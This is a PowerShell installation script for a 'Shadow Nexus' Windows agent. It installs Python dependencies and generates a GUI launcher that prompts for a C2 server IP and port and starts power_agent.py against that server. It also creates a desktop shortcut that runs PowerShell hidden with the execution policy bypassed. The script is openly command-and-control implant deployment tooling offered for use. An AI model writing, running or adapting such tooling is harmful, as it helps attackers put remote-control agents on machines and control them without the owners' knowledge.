# Shadow Nexus Windows Agent - Automated Installation
# PowerShell script for Windows systems

$ErrorActionPreference = "Stop"

function Write-ColorOutput($ForegroundColor) {
    $fc = $host.UI.RawUI.ForegroundColor
    $host.UI.RawUI.ForegroundColor = $ForegroundColor
    if ($args) {
        Write-Output $args
    }
    $host.UI.RawUI.ForegroundColor = $fc
}

Write-Host "=========================================="
Write-Host "Shadow Nexus Windows Agent Installation"
Write-Host "=========================================="
Write-Host ""

# Check if Python is installed
Write-ColorOutput Green "[1/6] Checking Python installation..."
try {
    $pythonVersion = python --version 2>&1
    Write-Host "Found: $pythonVersion"
} catch {
    Write-ColorOutput Red "Python not found. Please install Python 3.8+ from python.org"
    Write-Host "Download from: https://www.python.org/downloads/"
    exit 1
}

# Get script directory
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$AgentDir = Join-Path $ScriptDir "agent"

if (-not (Test-Path $AgentDir)) {
    Write-ColorOutput Red "Error: agent directory not found at $AgentDir"
    exit 1
}

Set-Location $AgentDir

# Install Python dependencies
Write-ColorOutput Green "[2/6] Installing Python dependencies (exact versions)..."
# Fix: Chain Join-Path calls for compatibility
$RequirementsDir = Join-Path "requirements" "windows"
$RequirementsPath = Join-Path $RequirementsDir "requirements.txt"

if (-not (Test-Path $RequirementsPath)) {
    Write-ColorOutput Red "Error: requirements.txt not found at $RequirementsPath"
    exit 1
}

python -m pip install --upgrade pip
python -m pip install -r $RequirementsPath

# Verify power_agent.py exists
Write-ColorOutput Green "[3/6] Checking agent files..."
if (-not (Test-Path "power_agent.py")) {
    Write-ColorOutput Red "Error: power_agent.py not found"
    exit 1
}

# Create GUI launcher script
Write-ColorOutput Green "[4/6] Creating GUI launcher..."
$LauncherScript = @'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Create form
$form = New-Object System.Windows.Forms.Form
$form.Text = 'Shadow Nexus Agent Launcher'
$form.Size = New-Object System.Drawing.Size(420,250)
$form.StartPosition = 'CenterScreen'
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $false

# Create IP label
$labelIP = New-Object System.Windows.Forms.Label
$labelIP.Location = New-Object System.Drawing.Point(20,20)
$labelIP.Size = New-Object System.Drawing.Size(350,20)
$labelIP.Text = 'C2 Server IP Address:'
$form.Controls.Add($labelIP)

# Create textbox for IP
$textBoxIP = New-Object System.Windows.Forms.TextBox
$textBoxIP.Location = New-Object System.Drawing.Point(20,45)
$textBoxIP.Size = New-Object System.Drawing.Size(360,20)
$textBoxIP.Text = '192.168.1.100'
$textBoxIP.Font = New-Object System.Drawing.Font("Consolas",10)
$form.Controls.Add($textBoxIP)

# Create Port label
$labelPort = New-Object System.Windows.Forms.Label
$labelPort.Location = New-Object System.Drawing.Point(20,75)
$labelPort.Size = New-Object System.Drawing.Size(350,20)
$labelPort.Text = 'C2 Server Port:'
$form.Controls.Add($labelPort)

# Create textbox for Port
$textBoxPort = New-Object System.Windows.Forms.TextBox
$textBoxPort.Location = New-Object System.Drawing.Point(20,100)
$textBoxPort.Size = New-Object System.Drawing.Size(360,20)
$textBoxPort.Text = '5000'
$textBoxPort.Font = New-Object System.Drawing.Font("Consolas",10)
$form.Controls.Add($textBoxPort)

# Create status label
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Location = New-Object System.Drawing.Point(20,130)
$statusLabel.Size = New-Object System.Drawing.Size(360,20)
$statusLabel.Text = 'Ready to launch'
$statusLabel.ForeColor = 'Green'
$statusLabel.Font = New-Object System.Drawing.Font("Arial",9,[System.Drawing.FontStyle]::Bold)
$form.Controls.Add($statusLabel)

# Create Launch button
$launchButton = New-Object System.Windows.Forms.Button
$launchButton.Location = New-Object System.Drawing.Point(20,160)
$launchButton.Size = New-Object System.Drawing.Size(175,35)
$launchButton.Text = 'Launch Agent'
$launchButton.Font = New-Object System.Drawing.Font("Arial",10,[System.Drawing.FontStyle]::Bold)
$launchButton.BackColor = [System.Drawing.Color]::FromArgb(0,120,215)
$launchButton.ForeColor = 'White'
$launchButton.FlatStyle = 'Flat'
$launchButton.Add_Click({
    $serverIP = $textBoxIP.Text.Trim()
    $serverPort = $textBoxPort.Text.Trim()
    
    # Validate IP
    if ([string]::IsNullOrEmpty($serverIP)) {
        [System.Windows.Forms.MessageBox]::Show('Please enter a server IP address', 'Error', 'OK', 'Error')
        return
    }
    
    # Validate IP format (basic)
    if ($serverIP -notmatch '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$') {
        [System.Windows.Forms.MessageBox]::Show('Please enter a valid IP address (e.g., 192.168.1.100)', 'Error', 'OK', 'Error')
        return
    }
    
    # Validate Port
    if ([string]::IsNullOrEmpty($serverPort)) {
        [System.Windows.Forms.MessageBox]::Show('Please enter a server port', 'Error', 'OK', 'Error')
        return
    }
    
    # Validate Port is numeric and in valid range
    try {
        $portNum = [int]$serverPort
        if ($portNum -lt 1 -or $portNum -gt 65535) {
            [System.Windows.Forms.MessageBox]::Show('Port must be between 1 and 65535', 'Error', 'OK', 'Error')
            return
        }
    } catch {
        [System.Windows.Forms.MessageBox]::Show('Port must be a valid number', 'Error', 'OK', 'Error')
        return
    }
    
    $c2Url = "http://${serverIP}:${serverPort}"
    $statusLabel.Text = "Launching agent to $c2Url..."
    $statusLabel.ForeColor = 'Orange'
    $form.Refresh()
    
    # Get agent directory
    $agentDir = Split-Path -Parent $MyInvocation.MyCommand.Path
    
    # Launch agent in new window
    try {
        Start-Process powershell -ArgumentList "-NoExit", "-Command", "cd '$agentDir'; Write-Host 'Shadow Nexus Agent' -ForegroundColor Cyan; Write-Host 'Connecting to: $c2Url' -ForegroundColor Yellow; Write-Host ''; python power_agent.py --server $c2Url"
        
        $statusLabel.Text = "Agent launched successfully!"
        $statusLabel.ForeColor = 'Green'
        Start-Sleep -Seconds 2
        $form.Close()
    } catch {
        [System.Windows.Forms.MessageBox]::Show("Failed to launch agent: $_", 'Error', 'OK', 'Error')
        $statusLabel.Text = "Launch failed!"
        $statusLabel.ForeColor = 'Red'
    }
})
$form.Controls.Add($launchButton)

# Create Cancel button
$cancelButton = New-Object System.Windows.Forms.Button
$cancelButton.Location = New-Object System.Drawing.Point(205,160)
$cancelButton.Size = New-Object System.Drawing.Size(175,35)
$cancelButton.Text = 'Cancel'
$cancelButton.Font = New-Object System.Drawing.Font("Arial",10)
$cancelButton.BackColor = [System.Drawing.Color]::FromArgb(240,240,240)
$cancelButton.FlatStyle = 'Flat'
$cancelButton.Add_Click({
    $form.Close()
})
$form.Controls.Add($cancelButton)

# Set default button (Enter key)
$form.AcceptButton = $launchButton
$form.CancelButton = $cancelButton

# Show form
$form.Add_Shown({$form.Activate(); $textBoxIP.Focus()})
[void]$form.ShowDialog()
'@

$LauncherScript | Out-File -FilePath "Launch-Agent.ps1" -Encoding UTF8

# Create desktop shortcut
Write-ColorOutput Green "[5/6] Creating desktop shortcut..."
$WshShell = New-Object -ComObject WScript.Shell
$DesktopPath = [System.Environment]::GetFolderPath('Desktop')
$ShortcutPath = Join-Path $DesktopPath "Shadow Nexus Agent.lnk"
$Shortcut = $WshShell.CreateShortcut($ShortcutPath)
$Shortcut.TargetPath = "powershell.exe"
$LaunchAgentPath = Join-Path $AgentDir "Launch-Agent.ps1"
$Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$LaunchAgentPath`""
$Shortcut.WorkingDirectory = $AgentDir
$Shortcut.IconLocation = "powershell.exe,0"
$Shortcut.Description = "Launch Shadow Nexus Agent with configurable C2 server"
$Shortcut.Save()

Write-ColorOutput Green "Desktop shortcut created: $ShortcutPath"

# Verify environment
Write-ColorOutput Green "[6/6] Verifying environment..."
if (Test-Path "verify_envirnoment.py") {
    python verify_envirnoment.py
}

Write-Host ""
Write-ColorOutput Green "=========================================="
Write-Host "Installation Complete!"
Write-ColorOutput Green "=========================================="
Write-Host ""
Write-Host "Agent is ready to launch!"
Write-Host ""
Write-Host "To start the agent:"
Write-Host "  1. Double-click the desktop shortcut: 'Shadow Nexus Agent'"
Write-Host "  2. Enter the C2 server IP address (default: 192.168.1.100)"
Write-Host "  3. Enter the C2 server port (default: 5000)"
Write-Host "  4. Click 'Launch Agent'"
Write-Host ""
Write-Host "OR manually run:"
Write-Host "  powershell -ExecutionPolicy Bypass -File Launch-Agent.ps1"
Write-Host ""
Write-ColorOutput Yellow "Note: You may need to allow script execution with:"
Write-ColorOutput Yellow "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser"
Write-Host ""
Write-Host "Desktop shortcut location:"
Write-Host "  $ShortcutPath"
Write-Host ""
Write-Host "Press any key to exit..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
